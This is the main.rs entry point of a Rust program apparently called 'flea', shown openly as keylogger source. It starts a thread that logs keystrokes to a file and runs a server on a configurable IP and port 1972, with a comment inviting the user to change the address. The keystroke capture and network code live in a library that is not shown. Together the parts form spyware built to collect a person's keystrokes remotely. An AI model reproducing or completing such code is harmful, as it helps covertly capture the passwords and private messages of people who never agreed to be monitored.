use std::{thread, env};
use std::sync::{Arc, Mutex};

#[macro_use]
extern crate log;

use flealib::fleaserver::FleaServer;
use flealib::keylogger::*;

//Change the ip address of the server according to your needs
const SERVER_IP: &'static str = "127.0.0.1:1972";

fn main() 
{
    env_logger::init();

    info!("Start");

    let dir = env::current_dir().expect("Couldn't get current directory!");
    let current_path = dir.join(flealib::keylogger::KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();

    remove_log_file(&current_path);

    let key_logger_data = Arc::new(Mutex::new(Keylogger{quit: false}));
    let kl = Arc::clone(&key_logger_data);

    let handle = thread::spawn(move|| {
        run(current_path, kl);
    });
    
    let flea_server = FleaServer{};
    flea_server.start(SERVER_IP);

    key_logger_data.lock().unwrap().quit = true;

    handle.join().unwrap();
}
